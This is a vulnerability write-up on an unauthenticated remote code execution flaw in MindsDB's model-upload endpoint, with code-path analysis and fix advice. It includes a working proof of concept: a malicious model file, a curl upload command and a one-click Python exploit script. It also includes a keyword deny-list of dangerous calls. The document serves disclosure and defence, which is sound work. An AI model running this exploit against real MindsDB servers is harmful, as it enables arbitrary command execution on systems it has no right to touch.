# MindsDB BYOM Remote Code Execution Vulnerability Analysis

## Preface

After analyzing the recently disclosed vulnerabilities, I became quite familiar with vulnerabilities in AI applications and AI components. Getting started with new research was quite fast, and I discovered several RCE vulnerabilities.

## Vulnerability Description

MindsDB's BYOM (Bring Your Own Model) feature allows users to upload custom Python model code via HTTP API.

**Key Issues**:
- Uploaded code is directly executed via `exec()` when creating the engine
- **No need to pre-create files on the server**
- **No authentication required** (default configuration)
- RCE can be achieved through a single HTTP PUT request

---

## Environment Setup

```bash
# 1. Clone vulnerable version
git clone https://github.com/mindsdb/mindsdb.git
cd mindsdb
git checkout v25.11.0

# 2. Install
pip install -e .

# 3. Start HTTP API
python -m mindsdb --api=http
```

The service will start at `http://127.0.0.1:47334`.

---

## Vulnerability Reproduction

### Prepare Malicious Code

First, we must comply with the file upload specification.

For example:

```python
import os
import subprocess

# Execute system command
result = subprocess.run(['id'], capture_output=True, text=True)
with open('/tmp/pwned.txt', 'w') as f:
    f.write(f'PWNED: {result.stdout}')
class MyModel:
    def train(self, df, target, args=None):
        return self
    def predict(self, df, args=None):
        return df
```

### PUT File Upload

```bash
curl -X PUT http://127.0.0.1:47334/api/handlers/byom/pwned \
  -F 'code=@model.py' \
  -F 'modules=@requirements.txt' \
  -F 'type=inhouse'
```

![Upload Result](https://gitee.com/nn0nkey/picture/raw/master/img/20260114180716789.png)

Since I had already reproduced it before, the file already exists. The filename is the next parameter after byom: pwned.

After uploading, it will execute automatically. We just need to verify:

![Verification](https://gitee.com/nn0nkey/picture/raw/master/img/20260114180856988.png)

---

## One-Click Reproduction Script

```python
#!/usr/bin/env python3
import requests
import sys
import time

TARGET = "http://127.0.0.1:47334"

# Malicious code
CODE = """import os, subprocess
result = subprocess.run(['whoami'], capture_output=True, text=True)
open('/tmp/pwned.txt', 'w').write('PWNED: ' + result.stdout)

class MyModel:
    def train(self, df, target, args=None): return self
    def predict(self, df, args=None): return df
"""

# Upload
files = {
    'code': ('model.py', CODE, 'text/plain'),
    'modules': ('requirements.txt', 'pandas\n', 'text/plain'),
}

r = requests.put(f"{TARGET}/api/handlers/byom/11", files=files, data={'type': 'inhouse'})
print(r.text)

if r.status_code == 200:
    time.sleep(1)
    print(open('/tmp/pwned.txt').read())
```

![Script Execution](https://gitee.com/nn0nkey/picture/raw/master/img/20260114181142028.png)

---

## Vulnerability Analysis

### Data Flow

```
PUT /api/handlers/byom/<name>
        │
        ▼
┌─────────────────────────────────────────────────────────────┐
│ 1. prepare_formdata()                                       │
│    Parse multipart, save uploaded code to temp file         │
└─────────────────────────────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────────────────────────────┐
│ 2. CreateMLEngine → integration_controller.add()            │
│    Read temp file content, pass to byom_handler             │
└─────────────────────────────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────────────────────────────┐
│ 3. byom_handler.create_engine()                             │
│    Call _get_model_proxy() to create ModelWrapperUnsafe     │
└─────────────────────────────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────────────────────────────┐
│ 4. ModelWrapperUnsafe.__init__()                            │
│    Call import_string(code)                                  │
└─────────────────────────────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────────────────────────────┐
│ 5. import_string() → exec(code, module.__dict__)  ← RCE     │
│    Directly execute user-provided Python code                │
└─────────────────────────────────────────────────────────────┘
```

---

### Key Code Analysis

#### API Authentication

**File**: `mindsdb/api/http/namespaces/handlers.py`

```python
@ns_conf.route("/byom/<name>")
class BYOMUpload(Resource):
    @ns_conf.doc("put_file")
    @api_endpoint_metrics("PUT", "/handlers/byom/handler")
    def put(self, name):
        """upload new model

        params in FormData:
            - code       # Python code file
            - modules    # requirements.txt
        """

        # 🔴 No authentication check - anyone can call
        params = prepare_formdata()

        code_file_path = params["code"]
        module_file_path = params["modules"]

        connection_args = {
            "code": code_file_path,      # Temp file path of user code
            "modules": module_file_path,
            "type": params.get("type")  # "inhouse" = execute in current process
        }

        # Create SQL command and execute
        ast_query = CreateMLEngine(
            name=Identifier(name),
            handler="byom",
            params=connection_args
        )
        command_executor.execute_command(ast_query)

        return "", 200
```

No authentication required, and the key parameters are:

```python
"code": code_file_path,      # Temp file path
"modules": module_file_path,
"type": params.get("type")  # "inhouse" = execute in current process
```

`code` serves as our main malicious file content, but it will be processed by the `prepare_formdata` function. Let's see how it's processed.

---

#### File Processing

**File**: `mindsdb/api/http/namespaces/handlers.py`

```python
def prepare_formdata():
    """Handle multipart uploaded files"""
    params = {}
    file_names = []

    def on_file(file):
        file_name = file.file_name.decode()

        # Has path traversal check, but only checks filename
        if Path(file_name).name != file_name:
            raise ValueError(f"Wrong file name: {file_name}")

        field_name = file.field_name.decode()

        # Only allow "code" and "modules" fields
        if field_name not in ("code", "modules"):
            raise ValueError(f"Wrong field name: {field_name}")

        params[field_name] = file.file_object
        file_names.append(field_name)

    # Create temp directory
    temp_dir_path = tempfile.mkdtemp(prefix="mindsdb_file_")

    # Configure multipart parser
    parser = multipart.create_form_parser(
        headers=request.headers,
        on_field=on_field,
        on_file=on_file,
        config={
            "UPLOAD_DIR": temp_dir_path.encode(),
            "UPLOAD_KEEP_FILENAME": True,
            "UPLOAD_KEEP_EXTENSIONS": True,
        },
    )

    # Parse request body
    while True:
        chunk = request.stream.read(8192)
        if not chunk:
            break
        parser.write(chunk)
    parser.finalize()

    # Write uploaded files to temp directory
    for file_name in file_names:
        file_path = os.path.join(temp_dir_path, file_name)
        with open(file_path, "wb") as f:
            params[file_name].seek(0)
            f.write(params[file_name].read())  # 🔴 Write our provided code
        params[file_name].close()
        params[file_name] = file_path  # Return file path

    return params
```

Our code is written to a temporary directory.

---

#### Code Execution

**File**: `mindsdb/integrations/handlers/byom_handler/proc_wrapper.py`

```python
def import_string(code, module_name='model'):
    """
    Import code string as Python module

    Args:
        code: Python code string (user-uploaded file content)
        module_name: Module name

    Returns:
        module: Module object containing executed code
    """
    import types

    # Create a new Python module
    module = types.ModuleType(module_name)

    # 🔴🔴🔴 Directly execute user-provided Python code
    # Code is executed in the module's __dict__ context
    exec(code, module.__dict__)

    return module
```

As you can see, `code` is passed as a parameter directly to the `exec` function for execution. However, there are requirements for the constructed Python code.

---

#### Python Code Requirements

**File**: `mindsdb/integrations/handlers/byom_handler/byom_handler.py`

```python
class ModelWrapperUnsafe:
    """Model wrapper executed in current process"""

    def __init__(self, code, modules_str, engine_id, engine_version: int):
        """
        Args:
            code: User-uploaded Python code content
            modules_str: requirements.txt content
        """
        self.module = import_string(code)

        # Find user-defined Model class
        model_class = find_model_class(self.module)
        if model_class is not None:
            model_instance = model_class()

        self.model_instance = model_instance

    def check(self, mode: str = None):
        """Check module and return method information"""
        methods = check_module(self.module, mode)
        return methods
```

**File**: `mindsdb/integrations/handlers/byom_handler/proc_wrapper.py`

```python
def check_module(module, mode):
    """Check module and return information"""

    methods = {}
    if mode == 'custom_function':
        methods = get_methods_info(module)
    else:
        # It's BYOM, check it
        # 🔴 Find class containing train and predict methods
        model_class = find_model_class(module)
        if model_class is None:
            raise RuntimeError('Unable to find model class')

        # 🔴 Try to instantiate model class
        model_class()

    return {'methods': methods}
```

Although this is a security check, it only checks the code structure, not the code content. So we can inject malicious code and trigger command execution.

---

## Fix Recommendations

**Use Sandboxed Execution Environment**

```python
def import_string_safe(code, module_name='model'):
    import types
    import ast

    # Static analysis check
    tree = ast.parse(code)
    for node in ast.walk(tree):
        # Block dangerous imports and calls
        if isinstance(node, (ast.Import, ast.ImportFrom)):
            for alias in node.names:
                if alias.name.split('.')[0] not in ALLOWED_IMPORTS:
                    raise SecurityError(f"Import blocked: {alias.name}")

    # Execute in restricted environment
    module = types.ModuleType(module_name)
    safe_globals = {'__builtins__': RESTRICTED_BUILTINS}
    exec(code, safe_globals, module.__dict__)
    return module
```

**Code Review Mechanism**

```python
def review_byom_code(code: str) -> bool:
    """Statically analyze BYOM code"""
    dangerous = [
        'subprocess', 'os.system', 'eval', 'exec',
        '__import__', 'pickle', 'marshal'
    ]
    for pattern in dangerous:
        if pattern in code:
            return False
    return True
```

---

## Disclaimer

This report is for security research and educational purposes only. All testing was conducted in authorized environments.

- Do not use the information provided in this article for any illegal purposes
- The vulnerability exploitation methods described in this article are only for understanding and fixing security vulnerabilities
- Any consequences resulting from the use of this information are the responsibility of the user

---

## References

- MindsDB GitHub: https://github.com/mindsdb/mindsdb
- BYOM Documentation: https://docs.mindsdb.com/advanced/byom
